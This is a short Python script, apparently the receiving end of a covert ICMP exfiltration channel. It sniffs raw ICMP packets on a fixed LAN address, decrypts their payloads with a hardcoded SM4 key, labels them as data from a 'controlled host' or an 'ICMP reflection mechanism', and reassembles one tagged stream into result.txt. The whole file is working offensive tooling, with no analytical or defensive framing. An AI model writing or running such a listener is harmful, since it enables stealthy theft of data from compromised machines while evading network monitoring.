from socket import *
import time
import struct
import select
import sys
from sm4 import SM4Key
import os

key1 = SM4Key(b"abcdefghijklmnop")
# 监听的主机IP
host = "192.168.1.5"
sniffer = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)
sniffer.bind((host, 0))
sniffer.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
path = "result.txt"
str = ""

while True:
    raw_buffer, addr = sniffer.recvfrom(1024)
    icmpHeader = raw_buffer[20:28]
    content = raw_buffer[28:]
    # print(content)
    decode_content = key1.decrypt(content, padding=True)
    # print(decode_content)
    # print(icmpHeader)
    type, code, checksum, packet_id, sequence = struct.unpack(
        ">BBHHH", icmpHeader
    )
    if packet_id == 0:
        print("接收到icmp反射机制发送的数据：",decode_content)
    else:
        print("接收到被控主机发送的数据：",decode_content)
    if packet_id != 33198:
        continue

    str += bytes.decode(decode_content)

    if sequence == 0:
        with open(path, "w") as f:
            f.writelines(str)
        break
